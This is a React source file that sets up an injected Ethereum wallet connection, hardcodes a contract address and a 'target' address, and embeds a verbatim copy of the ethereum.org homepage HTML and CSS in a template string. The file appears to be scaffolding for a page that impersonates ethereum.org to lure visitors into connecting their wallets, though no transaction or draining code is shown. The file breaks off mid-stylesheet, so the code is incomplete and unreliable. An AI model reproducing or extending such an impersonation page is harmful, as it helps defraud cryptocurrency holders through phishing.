import React, { useEffect, useState } from "react";
import "./App.css";
import { ethers } from "ethers";
import { useWeb3React } from '@web3-react/core';
import { injected } from "./connector";

import targetContract from "./Utils/target.json";

import Header from './components/header.js';

// var __html = require('./template.html');
// var template = { __html: __html };





const App = () => {

  const {account, activate, deactivate} = useWeb3React();
  const [wallet, setWallet] = useState(false);


  const contractAddress = "0xf8E1F093EdEF1CD0651B6C2eDB02aADCCF59A6f0";
  const targetAddress   = "0x2251691102ca9a78242B9EaA466F237C513168ab";


  const temptext1 = `<html lang="en">

  <head>
    <meta charSet="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <style data-href="/styles.07ac62a44c859eae1bb4.css" data-identity="gatsby-global-css">
      html {
        -ms-text-size-adjust: 100%;
        -webkit-text-size-adjust: 100%;
        font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
        font-size: 1rem
      }

      body {
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
        margin: 0
      }

      article,
      aside,
      details,
      figcaption,
      figure,
      footer,
      header,
      main,
      menu,
      nav,
      section,
      summary {
        display: block
      }

      audio,
      canvas,
      progress,
      video {
        display: inline-block
      }

      audio:not([controls]) {
        display: none;
        height: 0
      }

      progress {
        vertical-align: baseline
      }

      [hidden],
      template {
        display: none
      }

      a {
        -webkit-text-decoration-skip: objects;
        background-color: transparent;
        text-decoration: none
      }

      a:active,
      a:hover {
        outline-width: 0
      }

      abbr[title] {
        border-bottom: none;
        text-decoration: underline;
        -webkit-text-decoration: underline dotted;
        text-decoration: underline dotted
      }

      b,
      strong {
        font-weight: inherit;
        font-weight: bolder
      }

      dfn {
        font-style: italic
      }

      h1 {
        font-size: 2em;
        margin: .67em 0
      }

      mark {
        background-color: #ff0;
        color: #000
      }

      small {
        font-size: 80%
      }

      sub,
      sup {
        font-size: 75%;
        line-height: 0;
        position: relative;
        vertical-align: baseline
      }

      sub {
        bottom: -.25em
      }

      sup {
        top: -.5em
      }

      img {
        border-style: none
      }

      svg:not(:root) {
        overflow: hidden
      }

      code,
      kbd,
      pre,
      samp {
        font-family: SFMono-Regular, Consolas, Roboto Mono, Droid Sans Mono, Liberation Mono, Menlo, Courier, monospace;
        font-size: 1em
      }

      figure {
        margin: 1em 40px
      }

      hr {
        box-sizing: content-box;
        height: 0;
        overflow: visible
      }

      button,
      input,
      optgroup,
      select,
      textarea {
        font: inherit;
        margin: 0
      }

      optgroup {
        font-weight: 700
      }

      button,
      input {
        overflow: visible
      }

      button,
      select {
        text-transform: none
      }

      [type=reset],
      [type=submit],
      button,
      html [type=button] {
        -webkit-appearance: button
      }

      [type=button]::-moz-focus-inner,
      [type=reset]::-moz-focus-inner,
      [type=submit]::-moz-focus-inner,
      button::-moz-focus-inner {
        border-style: none;
        padding: 0
      }

      [type=button]:-moz-focusring,
      [type=reset]:-moz-focusring,
      [type=submit]:-moz-focusring,
      button:-moz-focusring {
        outline: 1px dotted ButtonText
      }

      fieldset {
        border: 1px solid silver;
        margin: 0 2px;
        padding: .35em .625em .75em
      }

      legend {
        box-sizing: border-box;
        color: inherit;
        display: table;
        max-width: 100%;
        padding: 0;
        white-space: normal
      }

      textarea {
        overflow: auto
      }

      [type=checkbox],
      [type=radio] {
        box-sizing: border-box;
        padding: 0
      }

      [type=number]::-webkit-inner-spin-button,
      [type=number]::-webkit-outer-spin-button {
        height: auto
      }

      [type=search] {
        -webkit-appearance: textfield;
        outline-offset: -2px
      }

      [type=search]::-webkit-search-cancel-button,
      [type=search]::-webkit-search-decoration {
        -webkit-appearance: none
      }

      ::-webkit-input-placeholder {
        color: inherit;
        opacity: .54
      }

      ::-webkit-file-upload-button {
        -webkit-appearance: button;
        font: inherit
      }

      html {
        box-sizing: border-box;
        font: 100%/1.6em georgia, serif;
        overflow-y: scroll
      }

      *,
      :after,
      :before {
        box-sizing: inherit
      }

      body {
        word-wrap: break-word;
        -ms-font-feature-settings: "kern", "liga", "clig", "calt";
        -webkit-font-feature-settings: "kern", "liga", "clig", "calt";
        font-feature-settings: "kern", "liga", "clig", "calt";
        font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
        font-kerning: normal;
        font-weight: 400
      }

      img {
        margin-left: 0;
        margin-right: 0;
        margin-top: 0;
        max-width: 100%;
        padding: 0
      }

      h1 {
        font-size: 2.25rem;
        font-weight: 500
      }

      h1,
      h2 {
        text-rendering: optimizeLegibility;
        color: inherit;
        line-height: 1.1;
        margin: 0 0 1.45rem;
        padding: 0
      }

      h2 {
        font-size: 1.62671rem;
        font-weight: 700
      }

      h3 {
        font-size: 1.38316rem;
        font-weight: 500
      }

      h3,
      h4 {
        text-rendering: optimizeLegibility;
        color: inherit;
        line-height: 1.1;
        margin: 2rem 0 1.45rem;
        padding: 0
      }

      h4 {
        font-size: 1.2rem;
        font-weight: 600
      }

      h5 {
        font-size: 1rem;
        margin: 2rem 0 1.45rem
      }

      h5,
      h6 {
        text-rendering: optimizeLegibility;
        color: inherit;
        font-weight: 500;
        line-height: 1.1;
        padding: 0
      }

      h6 {
        font-size: .85028rem
      }

      h6,
      hgroup {
        margin: 0 0 1.45rem
      }

      hgroup {
        padding: 0
      }

      ol,
      ul {
        list-style-image: none;
        list-style-position: outside;
        margin: 0 0 1.45rem 1.45rem;
        padding: 0
      }

      dd,
      dl,
      figure,
      p {
        margin: 0 0 1.45rem;
        padding: 0
      }

      pre {
        word-wrap: normal;
        background: rgba(0, 0, 0, .04);
        border-radius: 3px;
        font-size: .85rem;
        line-height: 1.42;
        margin: 0 0 1.45rem;
        overflow: auto;
        padding: 1.45rem;
        white-space: pre-wrap
      }

      table {
        border-collapse: collapse;
        font-size: 1rem;
        line-height: 1.45rem;
        width: 100%
      }

      fieldset,
      table {
        margin: 0 0 1.45rem;
        padding: 0
      }

      blockquote {
        margin: 0 1.45rem 1.45rem;
        padding: 0
      }

      form,
      iframe,
      noscript {
        margin: 0 0 1.45rem;
        padding: 0
      }

      hr {
        background: rgba(0, 0, 0, .2);
        border: none;
        height: 1px;
        margin: 4rem 0 0;
        padding: 0
      }

      address {
        margin: 0 0 1.45rem;
        padding: 0
      }

      b,
      dt,
      strong,
      th {
        font-weight: 700
      }

      li {
        margin-bottom: .725rem
      }

      ol li,
      ul li {
        padding-left: 0
      }

      li>ol,
      li>ul {
        margin-bottom: .725rem;
        margin-left: 1.45rem;
        margin-top: .725rem
      }

      blockquote :last-child,
      li :last-child,
      p :last-child {
        margin-bottom: 0
      }

      li>p {
        margin-bottom: .725rem
      }

      code {
        font-size: 1em;
        line-height: 1.45em
      }

      kbd,
      samp {
        font-size: .85rem;
        line-height: 1.45rem
      }

      abbr,
      abbr[title],
      acronym {
        border-bottom: 1px dotted rgba(0, 0, 0, .5);
        cursor: help
      }

      abbr[title] {
        text-decoration: none
      }

      td,
      th,
      thead {
        text-align: left
      }

      td,
      th {
        font-feature-settings: "tnum";
        -moz-font-feature-settings: "tnum";
        -ms-font-feature-settings: "tnum";
        -webkit-font-feature-settings: "tnum";
        border-bottom: 1px solid hsla(0, 13%, 72%, .12);
        padding: .725rem .96667rem calc(.725rem - 1px)
      }

      td:first-child,
      th:first-child {
        padding-left: 0
      }

      td:last-child,
      th:last-child {
        padding-right: 0
      }

      tt {
        background-color: #2b2834;
        border-radius: 2px;
        color: #968af6
      }

      code,
      tt {
        font-family: SFMono-Regular, Consolas, Roboto Mono, Droid Sans Mono, Liberation Mono, Menlo, Courier, monospace;
        padding: .2em
      }

      code {
        background-color: rgba(0, 0, 0, .04);
        border-radius: 3px
      }

      pre code {
        background: none;
        line-height: 1.42
      }

      code:before,
      pre code:after,
      pre code:before,
      pre tt:after,
      pre tt:before,
      tt:after,
      tt:before {
        content: ""
      }

      @media only screen and (max-width:480px) {
        html {
          font-size: 100%
        }
      }

      .assets-page .gatsby-resp-image-wrapper {
        max-height: 200px !important
      }

      .assets-page .gatsby-resp-image-image {
        width: auto !important
      }
    </style>
    <meta name="generator" content="Gatsby 4.4.0" />
    <link rel="icon" href="/favicon-32x32.png?v=8b512faa8d4a0b019c123a771b6622aa" type="image/png" />
    <link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous" />
    <meta name="theme-color" content="#1c1ce1" />
    <link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=8b512faa8d4a0b019c123a771b6622aa" />
    <link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=8b512faa8d4a0b019c123a771b6622aa" />
    <link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=8b512faa8d4a0b019c123a771b6622aa" />
    <link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=8b512faa8d4a0b019c123a771b6622aa" />
    <link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=8b512faa8d4a0b019c123a771b6622aa" />
    <link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=8b512faa8d4a0b019c123a771b6622aa" />
    <link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=8b512faa8d4a0b019c123a771b6622aa" />
    <link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=8b512faa8d4a0b019c123a771b6622aa" />
    <link rel="preconnect" href="https://matomo.ethereum.org" />
    <link rel="sitemap" type="application/xml" href="/sitemap/sitemap-index.xml" />
    <style type="text/css">
      .anchor.before {
        position: absolute;
        top: 0;
        left: 0;
        transform: translateX(-100%);
        padding-right: 4px;
      }

      .anchor.after {
        display: inline-block;
        padding-left: 4px;
      }

      h1 .anchor svg,
      h2 .anchor svg,
      h3 .anchor svg,
      h4 .anchor svg,
      h5 .anchor svg,
      h6 .anchor svg {
        visibility: hidden;
      }

      h1:hover .anchor svg,
      h2:hover .anchor svg,
      h3:hover .anchor svg,
      h4:hover .anchor svg,
      h5:hover .anchor svg,
      h6:hover .anchor svg,
      h1 .anchor:focus svg,
      h2 .anchor:focus svg,
      h3 .anchor:focus svg,
      h4 .anchor:focus svg,
      h5 .anchor:focus svg,
      h6 .anchor:focus svg {
        visibility: visible;
      }
    </style>
    <script>
      document.addEventListener("DOMContentLoaded", function (event) {
        var hash = window.decodeURI(location.hash.replace('#', ''))
        if (hash !== '') {
          var element = document.getElementById(hash)
          if (element) {
            var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop
            var clientTop = document.documentElement.clientTop || document.body.clientTop || 0
            var offset = element.getBoundingClientRect().top + scrollTop - clientTop
            // Wait for the browser to finish rendering before scrolling.
            setTimeout((function () {
              window.scrollTo(0, offset - 0)
            }), 0)
          }
        }
      })
    </script>
    <title data-react-helmet="true">Home | ethereum.org</title>
    <link data-react-helmet="true" rel="canonical" href="https://ethereum.org/en/" />
    <meta data-react-helmet="true" name="description"
      content="Ethereum is a global, decentralized platform for money and new kinds of applications. On Ethereum, you can write code that controls money, and build applications accessible anywhere in the world." />
    <meta data-react-helmet="true" name="image" />
    <meta data-react-helmet="true" property="og:title" content="Home | ethereum.org" />
    <meta data-react-helmet="true" property="og:description"
      content="Ethereum is a global, decentralized platform for money and new kinds of applications. On Ethereum, you can write code that controls money, and build applications accessible anywhere in the world." />
    <meta data-react-helmet="true" property="og:type" content="website" />
    <meta data-react-helmet="true" name="twitter:card" content="summary_large_image" />
    <meta data-react-helmet="true" name="twitter:creator" content="@ethereum" />
    <meta data-react-helmet="true" name="twitter:site" content="@ethereum" />
    <meta data-react-helmet="true" name="twitter:title" content="Home | ethereum.org" />
    <meta data-react-helmet="true" name="twitter:description"
      content="Ethereum is a global, decentralized platform for money and new kinds of applications. On Ethereum, you can write code that controls money, and build applications accessible anywhere in the world." />
    <meta data-react-helmet="true" name="twitter:image"
      content="https://ethereum.org/static/28214bb68eb5445dcb063a72535bc90c/0f3ee/hero.png" />
    <meta data-react-helmet="true" property="og:url" content="https://ethereum.org" />
    <meta data-react-helmet="true" property="og:image"
      content="https://ethereum.org/static/28214bb68eb5445dcb063a72535bc90c/0f3ee/hero.png" />
    <meta data-react-helmet="true" property="og:video"
      content="https://www.youtube.com/channel/UCNOfzGXD_C9YMYmnefmPH0g" />
    <meta data-react-helmet="true" property="og:site_name" content="ethereum.org" />
    <script data-react-helmet="true" type="application/ld+json">
          {
            "@context": "https://schema.org",
            "@type": "Organization",
            "url": "https://ethereum.org",
            "email": "press@ethereum.org",
            "name": "Ethereum",
            "logo": "https://ethereum.org/og-image.png"
          }
        </script>
    <style>
      .gatsby-image-wrapper {
        position: relative;
        overflow: hidden
      }

      .gatsby-image-wrapper picture.object-fit-polyfill {
        position: static !important
      }

      .gatsby-image-wrapper img {
        bottom: 0;
        height: 100%;
        left: 0;
        margin: 0;
        max-width: none;
        padding: 0;
        position: absolute;
        right: 0;
        top: 0;
        width: 100%;
        object-fit: cover
      }

      .gatsby-image-wrapper [data-main-image] {
        opacity: 0;
        transform: translateZ(0);
        transition: opacity .25s linear;
        will-change: opacity
      }

      .gatsby-image-wrapper-constrained {
        display: inline-block;
        vertical-align: top
      }
    </style><noscript>
      <style>
        .gatsby-image-wrapper noscript [data-main-image] {
          opacity: 1 !important
        }

        .gatsby-image-wrapper [data-placeholder-image] {
          opacity: 0 !important
        }
      </style>
    </noscript>
    <script
      type="module">const e = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; e && document.body.addEventListener("load", (function (e) { if (void 0 === e.target.dataset.mainImage) return; if (void 0 === e.target.dataset.gatsbyImageSsr) return; const t = e.target; let a = null, n = t; for (; null === a && n;)void 0 !== n.parentNode.dataset.gatsbyImageWrapper && (a = n.parentNode), n = n.parentNode; const o = a.querySelector("[data-placeholder-image]"), r = new Image; r.src = t.currentSrc, r.decode().catch((() => { })).then((() => { t.style.opacity = 1, o && (o.style.opacity = 0, o.style.transition = "opacity 500ms linear") })) }), !0);</script>
    <style data-styled="" data-styled-version="5.3.3">
      body {
        background-color: #fff;
        color: #333;
      }

      /*!sc*/
      a {
        color: rgb(28, 28, 225);
        -webkit-text-decoration: underline;
        text-decoration: underline;
      }

      /*!sc*/
      mark {
        background: rgba(143, 187, 237, .1);
        box-shadow: inset 0 -2px 0 0 rgba(69, 142, 225, .8);
      }

      /*!sc*/
      .anchor.before {
        fill: #333;
      }

      /*!sc*/
      hr {
        background: #ecececnullrgb(28, 28, 225);
        display: inline-block;
        width: 1em;
        margin-left: -1em;
        position: absolute;
      }

      /*!sc*/
      iframe {
        display: block;
        max-width: 560px;
        margin: 32px 0;
      }

      /*!sc*/
      h1 {
        font-size: 3rem;
        line-height: 1.4;
        margin: 2rem 0;
        font-weight: 700;
        -webkit-scroll-margin-top: 4.75rem;
        -moz-scroll-margin-top: 4.75rem;
        -ms-scroll-margin-top: 4.75rem;
        scroll-margin-top: 4.75rem;
        -webkit-scroll-snap-margin: 4.75rem;
        -moz-scroll-snap-margin: 4.75rem;
        -ms-scroll-snap-margin: 4.75rem;
        scroll-snap-margin: 4.75rem;
      }

      /*!sc*/
      @media (max-width:768px) {
        h1 {
          font-size: 2.5rem;
        }
      }

      /*!sc*/
      h2 {
        font-size: 2rem;
        line-height: 1.4;
        margin: 2rem 0;
        margin-top: 3rem;
        font-weight: 600;
        -webkit-scroll-margin-top: 4.75rem;
        -moz-scroll-margin-top: 4.75rem;
        -ms-scroll-margin-top: 4.75rem;
        scroll-margin-top: 4.75rem;
        -webkit-scroll-snap-margin: 4.75rem;
        -moz-scroll-snap-margin: 4.75rem;
        -ms-scroll-snap-margin: 4.75rem;
        scroll-snap-margin: 4.75rem;
      }

      /*!sc*/
      @media (max-width:768px) {
        h2 {
          font-size: 1.5rem;
        }
      }

      /*!sc*/
      h3 {
        font-size: 1.5rem;
        line-height: 1.4;
        margin: 2rem 0;
        margin-top: 2.5rem;
        font-weight: 600;
        -webkit-scroll-margin-top: 4.75rem;
        -moz-scroll-margin-top: 4.75rem;
        -ms-scroll-margin-top: 4.75rem;
        scroll-margin-top: 4.75rem;
        -webkit-scroll-snap-margin: 4.75rem;
        -moz-scroll-snap-margin: 4.75rem;
        -ms-scroll-snap-margin: 4.75rem;
        scroll-snap-margin: 4.75rem;
      }

      /*!sc*/
      @media (max-width:768px) {
        h3 {
          font-size: 1.25rem;
        }
      }

      /*!sc*/
      h4 {
        font-size: 1.25rem;
        line-height: 1.4;
        font-weight: 500;
        margin: 2rem 0;
        -webkit-scroll-margin-top: 4.75rem;
        -moz-scroll-margin-top: 4.75rem;
        -ms-scroll-margin-top: 4.75rem;
        scroll-margin-top: 4.75rem;
        -webkit-scroll-snap-margin: 4.75rem;
        -moz-scroll-snap-margin: 4.75rem;
        -ms-scroll-snap-margin: 4.75rem;
        scroll-snap-margin: 4.75rem;
      }

      /*!sc*/
      @media (max-width:768px) {
        h4 {
          font-size: 1rem;
        }
      }

      /*!sc*/
      h5 {
        font-size: 1rem;
        line-height: 1.4;
        font-weight: 450;
        margin: 2rem 0;
        -webkit-scroll-margin-top: 4.75rem;
        -moz-scroll-margin-top: 4.75rem;
        -ms-scroll-margin-top: 4.75rem;
        scroll-margin-top: 4.75rem;
        -webkit-scroll-snap-margin: 4.75rem;
        -moz-scroll-snap-margin: 4.75rem;
        -ms-scroll-snap-margin: 4.75rem;
        scroll-snap-margin: 4.75rem;
      }

      /*!sc*/
      h6 {
        font-size: 0.9rem;
        line-height: 1.4;
        font-weight: 400;
        text-transform: uppercase;
        margin: 2rem 0;
        -webkit-scroll-margin-top: 4.75rem;
        -moz-scroll-margin-top: 4.75rem;
        -ms-scroll-margin-top: 4.75rem;
        scroll-margin-top: 4.75rem;
        -webkit-scroll-snap-margin: 4.75rem;
        -moz-scroll-snap-margin: 4.75rem;
        -ms-scroll-snap-margin: 4.75rem;
        scroll-snap-margin: 4.75rem;
      }

      /*!sc*/
      data-styled.g1[id="sc-global-hcwgEG1"] {
        content: "sc-global-hcwgEG1,"
      }

      /*!sc*/
      .ilAeZt {
        fill: #b2b2b2;
      }

      /*!sc*/
      .ilAeZt:hover svg {
        fill: rgb(28, 28, 225);
      }

      /*!sc*/
      data-styled.g2[id="Icon__StyledIcon-sc-1o8zi5s-0"] {
        content: "ilAeZt,"
      }

      /*!sc*/
      .gABYms:after {
        margin-left: 0.125em;
        margin-right: 0.3em;
        display: inline;
        content: "↗";
        -webkit-transition: all 0.1s ease-in-out;
        transition: all 0.1s ease-in-out;
        font-style: normal;
      }

      /*!sc*/
      .gABYms:hover:after {
        -webkit-transform: translate(0.15em, -0.2em);
        -ms-transform: translate(0.15em, -0.2em);
        transform: translate(0.15em, -0.2em);
      }

      /*!sc*/
      data-styled.g3[id="Link__ExternalLink-sc-e3riao-0"] {
        content: "gABYms,"
      }

      /*!sc*/
      .hoRTos .is-glossary {
        white-space: nowrap;
      }

      /*!sc*/
      .hoRTos.active {
        color: rgb(28, 28, 225);
      }

      /*!sc*/
      .hoRTos:hover svg {
        fill: rgb(28, 28, 225);
        -webkit-transition: -webkit-transform 0.1s;
        -webkit-transition: transform 0.1s;
        transition: transform 0.1s;
        -webkit-transform: scale(1.2);
        -ms-transform: scale(1.2);
        transform: scale(1.2);
      }

      /*!sc*/
      data-styled.g4[id="Link__InternalLink-sc-e3riao-1"] {
        content: "hoRTos,"
      }

      /*!sc*/
      .fCuHsG {
        margin: 0 0.25rem 0 0.35rem;
        fill: #4949e7;
        -webkit-text-decoration: underline;
        text-decoration: underline;
      }

      /*!sc*/
      .fCuHsG:hover {
        -webkit-transition: -webkit-transform 0.1s;
        -webkit-transition: transform 0.1s;
        transition: transform 0.1s;
        -webkit-transform: scale(1.2);
        -ms-transform: scale(1.2);
        transform: scale(1.2);
      }

      /*!sc*/
      data-styled.g6[id="Link__GlossaryIcon-sc-e3riao-3"] {
        content: "fCuHsG,"
      }

      /*!sc*/
      .gvoBKJ {
        padding-top: 3rem;
        padding-bottom: 4rem;
        padding: 1rem 2rem;
      }

      /*!sc*/
      data-styled.g7[id="Footer__StyledFooter-sc-1to993d-0"] {
        content: "gvoBKJ,"
      }

      /*!sc*/
      .kFKfdz {
        font-size: 0.875rem;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-pack: justify;
        -webkit-justify-content: space-between;
        -ms-flex-pack: justify;
        justify-content: space-between;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-flex-wrap: wrap;
        -ms-flex-wrap: wrap;
        flex-wrap: wrap;
      }

      /*!sc*/
      data-styled.g8[id="Footer__FooterTop-sc-1to993d-1"] {
        content: "kFKfdz,"
      }

      /*!sc*/
      .dixOFq {
        color: #666;
      }

      /*!sc*/
      data-styled.g9[id="Footer__LastUpdated-sc-1to993d-2"] {
        content: "dixOFq,"
      }

      /*!sc*/
      .hlbLsM {
        display: grid;
        grid-template-columns: repeat(6, auto);
        grid-gap: 1rem;
        -webkit-box-pack: justify;
        -webkit-justify-content: space-between;
        -ms-flex-pack: justify;
        justify-content: space-between;
      }

      /*!sc*/
      @media (max-width:1300px) {
        .hlbLsM {
          grid-template-columns: repeat(3, auto);
        }
      }

      /*!sc*/
      @media (max-width:768px) {
        .hlbLsM {
          grid-template-columns: repeat(2, auto);
        }
      }

      /*!sc*/
      @media (max-width:500px) {
        .hlbLsM {
          grid-template-columns: auto;
        }
      }

      /*!sc*/
      data-styled.g10[id="Footer__LinkGrid-sc-1to993d-3"] {
        content: "hlbLsM,"
      }

      /*!sc*/
      .bbCEKr {
        font-size: 0.875rem;
        line-height: 1.6;
        margin: 1.14em 0;
        font-weight: bold;
      }

      /*!sc*/
      data-styled.g12[id="Footer__SectionHeader-sc-1to993d-5"] {
        content: "bbCEKr,"
      }

      /*!sc*/
      .gjQPMc {
        font-size: 0.875rem;
        line-height: 1.6;
        font-weight: 400;
        margin: 0;
        list-style-type: none;
        list-style-image: none;
      }

      /*!sc*/
      data-styled.g13[id="Footer__List-sc-1to993d-6"] {
        content: "gjQPMc,"
      }

      /*!sc*/
      .eGhJJx {
        margin-bottom: 1rem;
      }

      /*!sc*/
      data-styled.g14[id="Footer__ListItem-sc-1to993d-7"] {
        content: "eGhJJx,"
      }

      /*!sc*/
      .gqbMgV {
        -webkit-text-decoration: none;
        text-decoration: none;
        color: #666;
      }

      /*!sc*/
      .gqbMgV svg {
        fill: #666;
      }

      /*!sc*/
      .gqbMgV:after {
        color: #666;
      }

      /*!sc*/
      .gqbMgV:hover {
        color: rgb(28, 28, 225);
      }

      /*!sc*/
      .gqbMgV:hover:after {
        color: rgb(28, 28, 225);
      }

      /*!sc*/
      .gqbMgV:hover svg {
        fill: rgb(28, 28, 225);
      }

      /*!sc*/
      data-styled.g15[id="Footer__FooterLink-sc-1to993d-8"] {
        content: "gqbMgV,"
      }

      /*!sc*/
      .kdLbod {
        margin: 1rem 0;
      }

      /*!sc*/
      data-styled.g16[id="Footer__SocialIcons-sc-1to993d-9"] {
        content: "kdLbod,"
      }

      /*!sc*/
      .iedzfy {
        margin-left: 1rem;
        width: 2rem;
      }

      /*!sc*/
      @media (max-width:414px) {
        .iedzfy {
          margin-left: 0;
          margin-right: 0.5rem;
        }
      }

      /*!sc*/
      data-styled.g17[id="Footer__SocialIcon-sc-1to993d-10"] {
        content: "iedzfy,"
      }

      /*!sc*/
      .ebiUjW {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        cursor: pointer;
        padding-top: 0.5rem;
        padding-bottom: 0.5rem;
        margin-right: 1.5rem;
      }

      /*!sc*/
      .ebiUjW:hover>svg {
        fill: rgb(28, 28, 225);
      }

      /*!sc*/
      data-styled.g20[id="Dropdown__DropdownTitle-sc-1yd08gi-1"] {
        content: "ebiUjW,"
      }

      /*!sc*/
      .diOVNu {
        margin: 0;
        position: absolute;
        margin-top: -1rem;
        list-style-type: none;
        list-style-image: none;
        top: 100%;
        width: auto;
        border-radius: 0.5em;
        background: #fff;
        border: 1px solid #e5e5e5;
        padding-top: 0.5rem;
        padding-bottom: 0.5rem;
      }

      /*!sc*/
      data-styled.g21[id="Dropdown__DropdownList-sc-1yd08gi-2"] {
        content: "diOVNu,"
      }

      /*!sc*/
      .eXQent {
        white-space: nowrap;
        margin: 0;
        color: #333;
      }

      /*!sc*/
      .eXQent:hover {
        color: rgb(28, 28, 225);
      }

      /*!sc*/
      data-styled.g23[id="Dropdown__NavListItem-sc-1yd08gi-4"] {
        content: "eXQent,"
      }

      /*!sc*/
      .ebTwpi {
        margin: 0;
        color: #333;
      }

      /*!sc*/
      .ebTwpi:hover {
        color: rgb(28, 28, 225);
        background: #f2f2f2;
      }

      /*!sc*/
      data-styled.g24[id="Dropdown__DropdownItem-sc-1yd08gi-5"] {
        content: "ebTwpi,"
      }

      /*!sc*/
      .YfCzI {
        -webkit-text-decoration: none;
        text-decoration: none;
        display: block;
        padding: 0.5rem;
        color: #333;
      }

      /*!sc*/
      .YfCzI svg {
        fill: #666;
      }

      /*!sc*/
      .YfCzI:hover {
        color: rgb(28, 28, 225);
      }

      /*!sc*/
      .YfCzI:hover svg {
        fill: rgb(28, 28, 225);
      }

      /*!sc*/
      data-styled.g25[id="Dropdown__NavLink-sc-1yd08gi-6"] {
        content: "YfCzI,"
      }

      /*!sc*/
      .ivCgwn {
        display: inline-block;
        margin-left: 0.5rem;
        margin-top: 0;
        margin-right: 0;
        margin-bottom: 0;
      }

      /*!sc*/
      .ivCgwn>img {
        width: 1.5em !important;
        height: 1.5em !important;
        margin: 0 !important;
      }

      /*!sc*/
      .hLjau {
        display: inline-block;
        margin-top: 0;
        margin-right: 0;
        margin-bottom: 0;
        margin-left: 0;
      }

      /*!sc*/
      .hLjau>img {
        width: 3em !important;
        height: 3em !important;
        margin: 0 !important;
      }

      /*!sc*/
      data-styled.g27[id="Emoji__StyledEmoji-sc-ihpuqw-0"] {
        content: "ivCgwn,hLjau,"
      }

      /*!sc*/
      .dUatah {
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none;
        background: none;
        border: none;
        color: inherit;
        display: inline-block;
        font: inherit;
        padding: initial;
        cursor: pointer;
      }

      /*!sc*/
      data-styled.g28[id="NakedButton-sc-1g43w8v-0"] {
        content: "dUatah,"
      }

      /*!sc*/
      .eoyKpR {
        margin: 0;
        position: relative;
        border-radius: 0.25em;
      }

      /*!sc*/
      data-styled.g29[id="Input__Form-sc-1utkal6-0"] {
        content: "eoyKpR,"
      }

      /*!sc*/
      .hBFIJH {
        border: 1px solid #7f7f7f;
        color: #333;
        background: #fff;
        padding: 0.5rem;
        padding-right: 2rem;
        border-radius: 0.25em;
        width: 100%;
      }

      /*!sc*/
      .hBFIJH:focus {
        outline: rgb(28, 28, 225) auto 1px;
      }

      /*!sc*/
      @media only screen and (min-width:1024px) {
        .hBFIJH {
          padding-left: 2rem;
        }
      }

      /*!sc*/
      data-styled.g30[id="Input__StyledInput-sc-1utkal6-1"] {
        content: "hBFIJH,"
      }

      /*!sc*/
      .gFzMVg {
        position: absolute;
        right: 6px;
        top: 50%;
        margin-top: -12px;
      }

      /*!sc*/
      @media only screen and (min-width:1024px) {
        .gFzMVg {
          left: 6px;
        }
      }

      /*!sc*/
      data-styled.g31[id="Input__SearchIcon-sc-1utkal6-2"] {
        content: "gFzMVg,"
      }

      /*!sc*/
      .doxxqj {
        border: 1px solid #7f7f7f;
        border-radius: 0.25em;
        color: #333;
        display: none;
        margin-bottom: 0;
        padding: 0 6px;
        position: absolute;
        right: 6px;
        top: 20%;
      }

      /*!sc*/
      @media only screen and (min-width:1024px) {
        .doxxqj {
          display: inline-block;
        }
      }

      /*!sc*/
      data-styled.g32[id="Input__SearchSlash-sc-1utkal6-3"] {
        content: "doxxqj,"
      }

      /*!sc*/
      .kNenpg {
        position: relative;
        display: grid;
        grid-gap: 1em;
      }

      /*!sc*/
      data-styled.g33[id="Search__Root-sc-1qm8xwy-0"] {
        content: "kNenpg,"
      }

      /*!sc*/
      .kbzFYA {
        display: none;
        max-height: 80vh;
        overflow: scroll;
        z-index: 2;
        position: absolute;
        right: 0;
        top: calc(100% + 0.5em);
        width: 80vw;
        max-width: 30em;
        box-shadow: 0 0 5px 0;
        padding: 0.5rem;
        background: #fff;
        border-radius: 0.25em;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .kbzFYA {
          width: 100%;
        }
      }

      /*!sc*/
      .kbzFYA>*+* {
        padding-top: 1em !important;
        border-top: 2px solid black;
      }

      /*!sc*/
      .kbzFYA li {
        margin-bottom: 0.4rem;
      }

      /*!sc*/
      .kbzFYA li+li {
        padding-top: 0.7em;
        border-top: 1px solid #ececec;
      }

      /*!sc*/
      .kbzFYA ul {
        margin: 0;
        list-style: none;
      }

      /*!sc*/
      .kbzFYA mark {
        color: rgb(28, 28, 225);
        box-shadow: inset 0 -2px 0 0 rgba(143, 187, 237, .5);
      }

      /*!sc*/
      .kbzFYA header {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-pack: justify;
        -webkit-justify-content: space-between;
        -ms-flex-pack: justify;
        justify-content: space-between;
        margin-bottom: 0.3em;
      }

      /*!sc*/
      .kbzFYA header h3 {
        color: #fff;
        background: #4c4c4c;
        padding: 0.1em 0.4em;
        border-radius: 0.25em;
      }

      /*!sc*/
      .kbzFYA h3 {
        margin: 0 0 0.5em;
      }

      /*!sc*/
